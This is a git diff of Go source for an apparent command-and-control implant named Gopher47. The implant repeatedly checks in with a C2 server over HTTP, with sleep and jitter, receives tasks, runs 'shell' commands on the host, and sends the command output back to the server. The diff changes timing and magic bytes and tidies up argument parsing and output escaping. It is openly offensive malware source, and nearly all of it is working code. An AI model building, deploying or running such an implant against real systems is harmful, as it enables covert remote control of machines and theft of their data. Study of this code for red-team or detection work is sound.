@@ -14,16 +14,16 @@ import (
 	"strings"
 	"time"
 
-	"github.com/An00bRektn/gopher47/pkg/functions"
+	"github.com/An00bRektn/gopher47/pkg/agentfuncs"
 	"github.com/elastic/go-sysinfo"
 )
 
 // Globals
 // Only HTTP for now
 var url = "http://127.0.0.1:80/"
-var sleepTime = 15
+var sleepTime = 3
 var jitterRange = 100
-var magicBytes = []byte("\xc0\xff\xee\xee")
+var magicBytes = []byte("\x63\x61\x66\x65")
 var agentId = genHeader(4)
 
 func checkError(e error){
@@ -135,12 +135,18 @@ func checkIn(dat string, checkInType string) string{
 
 func RunCommand(command string) string {
 	output := ""
-	switch (strings.Split(command, " ")[0]){
+	//fmt.Printf(" [*] Command: ")
+	//fmt.Println([]byte(command))
+	val := strings.Split(command, " ")[0]
+	//fmt.Println([]byte(val))
+	switch (val){
 	case "shell":
-		output = functions.Shell(string(command[5:]))
+		cmdArgs := strings.Fields(command)
+		output = functions.Shell(cmdArgs[1:])
 	case "o7":
 		os.Exit(2)
 	}
+
 	return output
 }
 
@@ -156,19 +162,31 @@ func main(){
 	fmt.Println("[+] Gopher47 has checked in!")
 
 	command := ""
-	task := ""
 	out := ""
 	r := 1
 	// Begin execution
 	for {
 		command = checkIn("", "gettask")
-		//fmt.Println("[*] New Task: " + command)
 		if (len(command) > 4) {
-			task = strings.Split(command, string(command[0:4]))[1]
-			out = RunCommand(task)
-			checkIn(out, "commandoutput")
+			fmt.Println("[*] New Task: " + command)
+			out = RunCommand(Strip(command[4:]))
+			checkIn(jsonEscape(out), "commandoutput")
 		}
 		r = rand.Intn(jitterRange)
 		time.Sleep((time.Duration(sleepTime) * time.Second) + (time.Duration(r) * time.Microsecond))
 	}
+}
+
+func Strip(dirtyString string) string {
+	return strings.TrimSpace(string(bytes.Trim([]byte(dirtyString), "\x00")))
+}
+
+// https://stackoverflow.com/questions/51691901/how-do-you-escape-characters-within-a-string-json-format
+func jsonEscape(i string) string {
+    b, err := json.Marshal(i)
+    if err != nil {
+        panic(err)
+    }
+    // Trim the beginning and trailing " character
+    return string(b[1:len(b)-1])
 }
